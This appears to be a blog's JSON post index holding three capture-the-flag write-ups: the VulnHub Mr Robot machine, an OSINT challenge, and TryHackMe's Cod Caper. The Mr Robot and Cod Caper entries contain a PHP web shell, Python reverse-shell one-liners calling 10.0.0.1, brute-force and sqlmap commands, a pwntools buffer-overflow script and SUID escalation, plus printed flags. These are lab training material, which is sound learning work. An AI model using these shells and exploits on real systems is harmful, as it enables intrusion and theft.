[ { "title": "Mr Robot | Vuln Hub", "url": "/posts/Mr-Robot/", "categories": "Vulnhub, Medium", "tags": "Reconnaissance, Wordpress, Privilege escalation, Security", "date": "2025-08-01 16:00:00 +0500", "snippet": "Hello Again! I am starting a series of writeups in which I’ll cover walkthroughs of VulnHub machines. The difficulties will range from Easy to Hard.Task 1: Intro Note: This machine is based on the popular TV show Mr. Robot. It is an easy-medium level boot2root challenge. It has three hidden keys that we need to find.Task 2: Network and Host EnumerationThe first thing we need to do is to find the ip address assigned to the vulnerable machine. To find that, I’ll use netdiscover.netdiscover -i [interface]Once we get the ip address, we have to enumerate the machine for open ports.Task 3: Web EnumerationFrom the results of the nmap, we discover that 2 ports are open among 3. We’ll see what is running on port 80 by visiting the site. It is running some mr-robot styled shell. We can find the directories and files found on the webserver by using gobuster, dirb or perhaps nikto.It looks like we have found our first key and a .dic file.Flag 1 of 3: 073403c8a58a1f80d943455fb30724b9Let’s find out the contents of the fsocity.dic file.Seems like it contains a wordlist. Upon further investigation we find that it contains duplicate entries so we’ll just remove the repetitions and leave the unique entries so it takes less time to bruteforce.During directory enumeration we found another interesting page on the webserver /wp-login.ph. It indicates that the server is running wordpress.We neither know the username nor the password but we are given a wordlist, so we use it to bruteforce the username and password field.___Task 4: Web ExploitationI used burpsuite’s Intruder tab to first to find a valid username. Remember to put $ sign around the username field so the payload is placed here.NOTE: First check what the login form returns on unsuccessful attempts, so we set that error message inside payload error section, so when the correct username is found we stop the intruder from further attempts.Notice the length of the response on correct username (Elliot) is noticeably different from the failed attempts. Other than that, sometimes the status code, and error messages also tell us when we hit the correct payload.Now that we have the username, I’ll use hydra to bruteforce the password field.Hurrah! we have found the password: ER28-0652Let’s enter the credentials in the login page.Task 5: Template archive.phpWe have to upload a payload to start a reverse shell. Navigate to Appearance-&gt;Editor-&gt;archive.php, and paste the following.&lt;?php passthru($_GET[\"cmd\"]); ?&gt;This one-liner command creates a web shell. It gets the command from cmd parameter from the URL query string and passes it to passthru which executes system commands.Use netcat to listen on anyport, 4444 in my case.nc -lvnp 4444We’ll visit the http://192.168.43.216/wp-includes/themes/TwentyFifteen/archive.php?cmd=python -c ‘import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket. SOCK_STREAM);s.connect((“10.0.0.1”,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([“/bin/sh”,”-i”]);’ site in the browser which will spawn an interactive shell (reverse shell).We are currently logged in as daemon. Dols -laIt’ll output an md5 hash file and 2nd key. We can not see the 2nd key because only user robot has the permission to view the file. So we need to escalate privileges.The md5 hash contains the password for user robot so we put that hash into Crackstation. The password isLogin as user robot and view the 2nd key.Flag 2 of 3: 822c73956184f694993bede3eb39f959Task 6: Privilege Escalation - Getting rootThe third key resides inside /root, so we need to switch to root. For that we first search for files with SUID (Set User ID) permissions set. Execute the following command which will do it.find / -type f -perm -04000 -ls 2&gt;/dev/nullWe need command execution as superuser, so we find nmap interesting here, further we go to GTFOBins to abuse this behaviour.Execute the commands one by one and we finally get a shell as root.Navigate to /root/key-3-of-3.txt to get the 3rd and final key.Flag 3 of 3: 04787ddef27c3dee1ee161b21670b4e4" }, { "title": "The Hydra Corp | Arab CyberSecurity WarGames CTF", "url": "/posts/HydraChallenge/", "categories": "ACSWG, OSINT", "tags": "OSINT, exiftool", "date": "2022-08-06 10:00:00 +0500", "snippet": "This is the writeup for Hydra Corp Challenge of Arab CyberSecurity Wargames CTF. It was a 900 pts challenge.Challenge Description The world has become an unsafe place and has become full of evildoers. Terrorist operations have become a big business that many extremist groups from all races, religions, and countries use. Indeed, some countries have taken extremism and violence as a method for them to impose their control over the surrounding area.During the investigation, the FBI office found a communication map between a group of extremist elements belonging to different groups.After a careful investigation, the analysts of the FBI found that there were two people in the same group who were sending some dangerous classified information to each other.If you can find these two like the Bureau did and find out what secrets they convey, you will find your science.Challenge FilesWe are given an image of Learner Driving License of the subject.Hint Section 5 is importantSolutionSection 5Based on the hint, when we inspect the section 5 of the license, we can see that it is kind of a serial number. But some letters are invisible due to the reflection. But the same serial number is given below.I first typed this serial number in Google search bar and it came up with few images of driving licenses. This is the point when I noted that we are given a license that has its photo replaced with a fake one and the read license has letter L but ours had a barcode.The BAR CodeWhat are we supposed to do with the barcode? Google Lens for the rescue. I opened google lens in my phone and zoomed in the license that was given in the challenge and scanned the Bar code.The MatrixWhen we tap on the link, we are redirected to a map with several markers of people having connections with militants groups. The challenge description says there are two people sending classified information so we know that we have to find two markers in the map. I kept tapping on every marker until I found two with pastebin links.The Pastebin LinksOn visiting both links, we find that these pastebins contain some kind of base64 encoded strings.Note: One of the pastebin is locked, its password is already given, which is the license number.The Mysterious Base64 StringThe given ciphers look like base64 strings but are actually RSA Key and Msg. We paste these key and cipher msg in an online decoder aaaaannnnnDDD!We Finally have a link.https://postimg.cc/gallery/WvQpm6XThe Last DuelWhen we visit the link, It contains 5 images of different guns, bombs, and warfare vehicles.We download these images and see the metadata of images using exiftool.┌──(kali㉿kali)-[~/Downloads]└─$ exiftool [filename]And the exifdata of grenades-large.jpg contains the flag.The FLAGACSWG{M@kE_Th3_WOr1D_5@fEr}" }, { "title": "The Cod Caper | TryHackMe", "url": "/posts/The-Cod-Caper/", "categories": "THM, BinaryExploitation", "tags": "pwn, pwntools, Reversing, security", "date": "2022-08-04 16:00:00 +0500", "snippet": "Hey there! This is my first writeup in which I’ll be walking you through infiltrating and exploiting a Linux system. This writeup will be a bit longer as it covers binary exploitation as well.Task 1: Intro Note: This room expects some basic pen testing knowledge, as I will not be going over every tool in detail that is used. While you can just use the room to follow through, some interest or experiencing in assembly is highly recommendedTask 2: Host EnumerationI’ll use nmap for scanning the host for open ports and services running on these ports.nmap -sC -sV [Target IP]Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-04 15:22 EDTNmap scan report for &lt;IP&gt;Host is up (0.52s latency).Not shown: &lt;N&gt; closed tcp ports (conn-refused)PORT STATE SERVICE VERSION&lt;Redacted&gt;Task 3: Web EnumerationNow that we know what ports are open, we can further enumerate and use dirbuster for directory busting. We are already provided the wordlist big.txtdibuster&amp;dirbuster has returned the name of the important file on the server.Task 4: Web ExploitationOnce we visit the page that we got through directory busting, we see that it is a login form.We can use burpsuite but we are not provided any wordlist for doing a bruteforce attack. Instead we can check for possible sql injection which will output the username and password for us to login.sqlmap -u http://[IP]/[Login Page] --forms --dumpLet sqlmap do its job. Once it is done you can answer questions of this task.Task 5: Command ExecutionWhen we login, we are presented with a text box. In this text box we can enter commands and it’ll execute it for us and show us the output.For example running whoami gives us the following output:If we can run whoami, we can get a reverse shell as well. SMART Right! Let’s do this.Copy the following python code and paste it in the text box. REMEMBER to change the IP to your IP address.python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'Also listen for incoming connections through netcat before executing the command pasted inside text box.nc -lvnp 4242This should give you a reverse shell┌──(kali㉿kali)-[~]└─$ nc -lvnp 5555 listening on [any] 5555 ...connect to [10.0.0.1] from (UNKNOWN) [10.10.154.134] 34572$ whoamiwhoamiwww-data$ We got a reverse shell, What’s next? Well… We have to switch to pingu’s account but how?SSH to the rescue!When we were doing host enumeration, we found out that port 22 is open as well. So we can ssh, but we don’t know the password for pingu’s account. We can do a quick linpeas and find any interesting files that can contain possible ssh passwords or we can find file that are owned by current user. I’ll go with the second method.$ find / -user \"www-data\" -name \"*\" 2&gt; /dev/nullWe ran find with user www-data which is the current user and we get all the files owned by this user. See anything Interesting? Any hidden password file? Hint: /var/*Open this file and it contains the ssh password. Simply Do:$ su pingusu pinguPassword: &lt;Redacted&gt;To run a command as administrator (user \"root\"), use \"sudo &lt;command&gt;\".See \"man sudo_root\" for details.pingu@ubuntu:/tmp$ And we have switched to pingu’s account!Task 6: LinEnum/LinpeasWhat NOW? We need to get root access to recover pingu’s chest Right!At this point we can automate the process and let linpeas find Interesting files for us. But I am gonna check files that have SUID bit set manually by using this command:$ find / -perm -04000 2&gt; /dev/nullThis returns several files but one file catches my attention. Hint: /opt/*Task 7,8 and 9: pwndbgFrom previous task we got a binary named root. The source code of the binary is given in the room as well.#include \"unistd.h\"#include \"stdio.h\"#include \"stdlib.h\"void shell(){setuid(1000);setgid(1000);system(\"cat /var/backups/shadow.bak\");}void get_input(){char buffer[32];scanf(\"%s\",buffer);}int main(){get_input();}When we inspect the source code, we can see that buffer can take no more than 32 characters. It is vulnerable to buffer overflow. and we can also see that shell() funcion which outputs the shadow backup file which contains the hashes for accounts on a system. We are interested in the hash of root account. main() function does not call shell() but if we overflow the buffer variable and control the EIP registed and concatenate the address of the shell() then it will get executed and print the shadow file. So let’s do this step by step: Let’s do a quick file type check pingu@ubuntu:/opt/secret$ file rootroot: setuid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=af41c72a4c8f1a4d720315cdafa47536e92657b2, not stripped    We are dealing with a x86 architecture binary Before we go any further, do a checksec as well to check the properties of the executable.pingu@ubuntu:/opt/secret$ checksec root[*] '/opt/secret/root' Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x8048000) RWX: Has RWX segments   No Canary, NX disabled and No PIE in this case.But what are these?Let me quote the definitions below:Stack Canaries Stack Canaries are tokens placed after a stack to detect a stack overflow. On a less morbid note, stack canaries sit beside the stack \t\t\tin memory (where the program variables are stored), and if there is a stack overflow, \t\t\tthen the canary will be corrupted. This allows the program to detect a buffer overflow \t\t\tand shut down.NX NX is short for non-executable. If this is enabled, then memory segments can be either \t\t\twritable or executable, but not both. This stops potential attackers from injecting their \t\t\town malicious code (called shellcode) into the program, because something in a writable \t\t\tsegment cannot be executed.  On the vulnerable binary, you may have noticed the extra \t\t\tline RWX that indicates that there are segments which can be read, written, and \t\t\t\texecuted.PIE PIE stands for Position Independent Executable. This loads the program dependencies into \t\trandom locations, so attacks that rely on memory layout are more difficult to conduct.Now that you know what Stack Canary, NX and PIE is! Let’s continue where we left. We’ll run the binary and input character less than length 32 (Remember the buffer size!). It’ll exit normally. pingu@ubuntu:/opt/secret$ ./rootabc    But when we enter more than 32 character it shows us Segmentation Fault Let’s investigate further but opening the binary in pwndbg, and run it with more than 32 characters input. It’ll show us the registers that were overwritten by extra inputs.pingu@ubuntu:/opt/secret$ gdb rootpwndbg&gt; run &lt; &lt;(cyclic 50)   Here is the output.   The output shows that EIP is overwritten. EIP or Extended Instruction Pointer is a register which carries the address of the next instruction that is to be executed. In this case we have overwritten EIP with 4 bytes generated from cyclic. If instead of ‘laaa’ we provide the address of that command which will point to shell function then we can run shell function too. We need to find out how many bytes we have to write before overwriting the EIP, because we want to give EIP our desired address. Using cyclic -l [address where error occurred] we can find out that.pwndbg&gt; cyclic -l 0x6161616c44   44 bytes in this case. Everything is set. The only thing we need to find out is which function will execute shell in the binary and the address of that function. There are several way.      Method 1:pwndbg&gt; info functions      This will output all the functions in the binary. and we can see that shell has address 0x080484cb      Method 2:pwndbg&gt; print&amp; shell      This will print the address of only shell function.      Method 3:pwndbg&gt; disassemble shell      This will show the inner workings of shell function and our address of interest is again 0x080484cb Now that we know the address of the shell function and how many bytes we need before we overwrite EIP, The last piece is to write a python script to run the shell function.from pwn import *padding = cyclic(cyclic_find('laaa'))eip = p32(0x080484cb)payload = padding + eipprint(payload)   The first line imports the pwntools library. On third line cyclic_find finds where the pattern laaa has occured in the pwn cyclic 50 output and returns its position index which is 44 and passes to cyclic which outputs 44 characters. The fourth line packs our address of shell function into little endian output. Then on 5th line we concatenate both padding and eip into payload variable and print the output. We run this python script and pass the output into a file and pass that file to our binary input.pingu@ubuntu:/opt/secret$ python2.7 exploit.py &gt; attackpingu@ubuntu:/opt/secret$ ./root &lt; attack   This will output the contents of /var/backups/shadow.bak file which contains the hash of root as well.Task 10: Finishing the JobNow that we have the hash of root, we can run hashcat and recover the password.hashcat -a 0 -m 1800 [hashroot] /usr/share/wordlists/rockyou.txtFinally pingu will be having quite a dinner with those fishes. " } ]
